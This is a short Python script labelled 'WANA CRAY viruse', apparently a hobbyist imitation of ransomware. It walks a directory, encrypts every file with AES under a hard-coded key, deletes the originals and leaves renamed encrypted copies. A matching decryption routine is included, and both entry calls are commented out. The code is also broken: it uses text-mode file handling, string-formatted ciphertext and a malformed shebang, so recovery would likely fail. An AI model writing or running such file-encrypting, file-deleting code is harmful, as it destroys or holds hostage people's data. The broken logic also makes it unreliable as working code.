#usr/bin/local/python3


g = """
          WANA CRAY viruse

"""

print(g)
import sys
import os
from Crypto.Cipher import AES
from Crypto import Random
    
#key = Random.new.read(16)
iv = Random.new().read(16)
def crypt(path):
    for path ,dirr,files in os.walk(path):
        s = 0
        while s in range(0,len(files)):
            
            t = path+"/"+files[s]
            with  open(t,"r") as re:
                rod = re.read()
                
                with open(t+"dz","w") as wr:
                    
                    cyph = AES.new('Sixteen byte key',AES.MODE_CFB,iv)
                    
                    oop = cyph.encrypt(rod)
                    os.remove(t)
                    
                    wr.write("%s"%oop)        
            s=s+1
            pass
#crypt(input("===> path ===> "))


def dcryp(patl):
    for patl,ui,ri in os.walk(patl):
        gg = 0
        while gg in range(0,len(ri)):
            ze = patl+"/"+ri[gg]
            with open(ze,"r") as ko:
                tod = ko.read()
                with open(ze[:-2],"w") as wri:
                    cyph = AES.new('Sixteen byte key',AES.MODE_CFB,iv)
                    mpp = cyph.decrypt(tod)
                    os.remove(ze)
                    wri.write("%s"%mpp)
            
            gg=gg+1    
            pass
            
    
#dcryp(input("===> pathde crypt ===> "))
    
    
